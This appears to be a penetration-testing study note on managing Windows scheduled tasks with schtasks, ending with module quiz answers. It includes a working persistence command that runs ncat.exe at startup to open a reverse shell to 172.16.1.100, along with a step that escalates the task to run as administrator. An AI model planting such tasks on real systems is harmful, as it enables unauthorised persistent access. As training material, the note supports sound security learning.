### **What Are Scheduled Tasks?**
- **Purpose**: Automate repetitive tasks without manual intervention.
- **Uses**:
    - System maintenance
    - Running applications/scripts
    - Persistence mechanism for attackers
- #### **Triggers for Scheduled Tasks**
	- Scheduled tasks execute based on **triggers**, including:
		- **System Events** (e.g., logon, boot, session state changes)
		- **Time-Based Triggers** (e.g., daily, weekly, monthly)
		- **Idle Time Triggers** (when the system is idle)
- #### **Managing Scheduled Tasks with `schtasks`**
	- The `schtasks` command allows querying, creating, modifying, and deleting scheduled tasks.



### **1. Viewing Existing Scheduled Tasks**
- #### **Query Syntax**
```cmd
SCHTASKS /Query /V /FO LIST
```
- **Parameters:**
	- `/V` → Verbose output (detailed view)
	- `/FO list` → Formats output as a list (other formats: `table`, `csv`)
- **Example Output:**
```cmd
TaskName:       \Check Network Access
Task To Run:    C:\Windows\System32\cmd.exe ping 8.8.8.8
Schedule Type:  At system startup
Run As User:    tru7h
Scheduled Task State: Enabled
```



### **2. Creating a New Scheduled Task**
- #### **Create Syntax**
```cmd
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```
- **Parameters:**
	- `/sc ONSTART` → Trigger at system startup
	- `/tn "My Secret Task"` → Task name
	- `/tr <command>` → Action to execute
- ✅ **Example Use Case:**
	- Creates a scheduled task to execute `ncat.exe` upon system startup, providing **persistent shell access**.



### **3. Modifying an Existing Task**
- #### **Change Syntax**
```cmd
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```
- **Parameters:**
	- `/tn` → Task name to modify
	- `/ru` → Change the user running the task
	- `/rp` → Specify the password
- ✅ **Example Use Case:**
	- Change task to run as `administrator`, elevating privileges.
- #### **Verify Changes**
```cmd
schtasks /query /tn "My Secret Task" /V /fo list
```
- **Expected Output:**
```cmd
Task To Run:  C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Run As User:  SYSTEM
Scheduled Task State: Enabled
```



### **4. Running a Scheduled Task Immediately**
```cmd
schtasks /run /tn "My Secret Task"
```
- ✅ **Example Use Case:**
	- Manually triggers the scheduled task to execute immediately.



### **5. Deleting a Scheduled Task**
- #### **Delete Syntax**
```cmd
schtasks /delete /tn "My Secret Task"
```
- **Prompt:**
```
WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```
- To **force delete** without confirmation:
```cmd
schtasks /delete /tn "My Secret Task" /F
```
- ✅ **Example Use Case:**
	- Removes the task from the system.



### **Key Takeaways**
- **`schtasks`** is used to manage Windows scheduled tasks.
- **Querying tasks** helps identify existing automated actions.
- **Creating/modifying tasks** allows automation or potential persistence (e.g., reverse shell on reboot).
- **Deleting tasks** ensures cleanup after execution.
- **Proper syntax and parameters** are crucial for success.



### Questions
- True or False: A scheduled task can be set to run when a user logs onto a host?
	- True
- Access the target host and take some time to practice working with Scheduled Tasks. Type COMPLETE as the answer when you are ready to move on.
	- COMPLETE